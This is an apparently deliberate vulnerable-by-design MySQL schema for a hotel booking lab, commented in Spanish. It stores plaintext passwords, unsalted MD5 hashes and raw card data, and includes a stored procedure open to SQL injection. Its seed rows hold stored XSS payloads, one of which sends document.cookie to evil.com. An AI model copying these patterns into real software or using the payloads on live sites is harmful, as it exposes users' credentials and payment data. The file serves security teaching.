-- ⚠️ ESTRUCTURA DE BASE DE DATOS CON DISEÑO INSECURO

CREATE DATABASE IF NOT EXISTS booking_vulnerable;
USE booking_vulnerable;

-- Tabla de usuarios con columnas inseguras
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    
    -- ⚠️ Contraseñas en texto plano (nunca hacer esto)
    password_plain VARCHAR(255),
    
    -- ⚠️ Hash débil sin salt
    password_hash VARCHAR(32),  -- MD5
    
    -- ⚠️ Token de sesión en BD
    session_token VARCHAR(255),
    
    -- ⚠️ Información sensible sin encriptar
    credit_card VARCHAR(19),
    card_expiry VARCHAR(7),
    card_cvv VARCHAR(3),
    
    is_admin BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL
);

-- Tabla de hoteles
CREATE TABLE hotels (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100) NOT NULL,
    
    -- ⚠️ Campo que podría contener JavaScript
    description TEXT,
    
    location VARCHAR(100),
    price DECIMAL(10,2) NOT NULL,
    image_url VARCHAR(255),
    
    -- ⚠️ Configuración expuesta
    config JSON,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Tabla de reseñas (XSS almacenado)
CREATE TABLE reviews (
    id INT PRIMARY KEY AUTO_INCREMENT,
    hotel_id INT NOT NULL,
    user_id INT NOT NULL,
    
    -- ⚠️ Contenido sin sanitizar
    content TEXT NOT NULL,
    
    rating INT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (hotel_id) REFERENCES hotels(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Tabla de reservas
CREATE TABLE reservations (
    id INT PRIMARY KEY AUTO_INCREMENT,
    hotel_id INT NOT NULL,
    user_id INT NOT NULL,
    
    -- ⚠️ Precio que podría diferir del precio real
    paid_price DECIMAL(10,2) NOT NULL,
    actual_price DECIMAL(10,2) NOT NULL,
    
    check_in DATE,
    check_out DATE,
    
    -- ⚠️ Estado que podría ser manipulado
    status VARCHAR(20) DEFAULT 'pending',
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (hotel_id) REFERENCES hotels(id),
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Tabla de logs que expone información
CREATE TABLE audit_logs (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT,
    action VARCHAR(255) NOT NULL,
    
    -- ⚠️ Almacena datos sensibles en logs
    data TEXT,
    
    ip_address VARCHAR(45),
    user_agent TEXT,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ⚠️ Datos de prueba con vulnerabilidades
INSERT INTO users (username, email, password_plain, password_hash, is_admin) VALUES
('admin', 'admin@booking.com', 'admin123', MD5('admin123'), TRUE),
('john_doe', 'john@example.com', 'password123', MD5('password123'), FALSE),
('test_user', 'test@example.com', 'test123', MD5('test123'), FALSE);

INSERT INTO hotels (name, description, location, price) VALUES
('Hotel XSS', '<script>alert("XSS")</script>Excelente hotel', 'Madrid', 150.00),
('Beach Resort', 'Hermosa playa <img src=x onerror=alert(1)>', 'Cancún', 200.00),
('Mountain Lodge', 'Vistas increíbles', 'Alpes', 120.00);

INSERT INTO reviews (hotel_id, user_id, content, rating) VALUES
(1, 2, 'Me encantó! <script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>', 5),
(1, 3, 'Buen servicio pero caro', 3);

-- ⚠️ Procedimientos almacenados vulnerables
DELIMITER //
CREATE PROCEDURE GetUserByEmail(IN user_email VARCHAR(100))
BEGIN
    -- ⚠️ SQL Injection en procedimiento almacenado
    SET @sql = CONCAT('SELECT * FROM users WHERE email = "', user_email, '"');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END //
DELIMITER ;